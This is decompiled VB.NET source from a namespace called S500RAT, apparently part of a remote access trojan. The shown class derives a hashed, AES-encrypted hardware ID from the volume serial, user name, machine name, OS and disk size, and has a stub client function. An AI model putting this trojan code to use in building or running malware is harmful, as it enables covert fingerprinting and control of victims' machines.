Imports System
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports Microsoft.VisualBasic

Namespace S500RAT
	' Token: 0x02000067 RID: 103
	Public Class APIH
		' Token: 0x060011CD RID: 4557 RVA: 0x0009F254 File Offset: 0x0009D454
		Public Shared Function GetHWID(Password As String) As String
			Dim result As String
			Try
				Dim array As Object() = New Object(6) {}
				array(0) = "S-500RAT vG2 2022"
				Dim num As Integer = 1
				Dim text As String = "C:\"
				array(num) = APIH.GetSerialNumber(text)
				array(2) = Environment.ProcessorCount
				array(3) = Environment.UserName
				array(4) = Environment.MachineName
				array(5) = Environment.OSVersion
				array(6) = New DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize
				result = Functions.AES_EncryptText(APIH.GetHash(String.Concat(array)), Password)
			Catch ex As Exception
				result = "Not Found"
			End Try
			Return result
		End Function

		' Token: 0x060011CE RID: 4558
		Private Declare Ansi Function GetVolumeInformation Lib "kernel32.dll" Alias "GetVolumeInformationA" (<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, nVolumeNameSize As Short, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, nFileSystemNameSize As Integer) As Integer

		' Token: 0x060011CF RID: 4559 RVA: 0x0009F300 File Offset: 0x0009D500
		Private Shared Function GetSerialNumber(ByRef strDrive As String) As Integer
			Dim expression As String = New String(vbNullChar, 255)
			Dim expression2 As String = New String(vbNullChar, 255)
			Dim nVolumeNameSize As Short = CShort(Strings.Len(expression))
			Dim num As Integer = 0
			Dim num2 As Integer = 0
			Dim result As Integer
			Dim volumeInformation As Integer = APIH.GetVolumeInformation(strDrive, expression, nVolumeNameSize, result, num, num2, expression2, Strings.Len(expression2))
			Return result
		End Function

		' Token: 0x060011D0 RID: 4560 RVA: 0x0009F350 File Offset: 0x0009D550
		Private Shared Function GetHash(strToHash As String) As String
			Dim md5CryptoServiceProvider As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
			Dim array As Byte() = Encoding.ASCII.GetBytes(strToHash)
			array = md5CryptoServiceProvider.ComputeHash(array)
			Dim stringBuilder As StringBuilder = New StringBuilder()
			For Each b As Byte In array
				stringBuilder.Append(b.ToString("x2"))
			Next
			Return stringBuilder.ToString().Substring(0, 20).ToUpper()
		End Function

		' Token: 0x060011D1 RID: 4561 RVA: 0x0009F3CC File Offset: 0x0009D5CC
		Public Shared Function GetClient(Url As String) As Object
			Dim text As String = "NULL"
			Dim result As Object
			Try
				result = text
			Catch ex As Exception
				result = ""
			End Try
			Return result
		End Function

		' Token: 0x040007D6 RID: 2006
		Public Shared N1 As String

		' Token: 0x040007D7 RID: 2007
		Public Shared N2 As String

		' Token: 0x040007D8 RID: 2008
		Public Shared N3 As String

		' Token: 0x040007D9 RID: 2009
		Public Shared N4 As String
	End Class
End Namespace
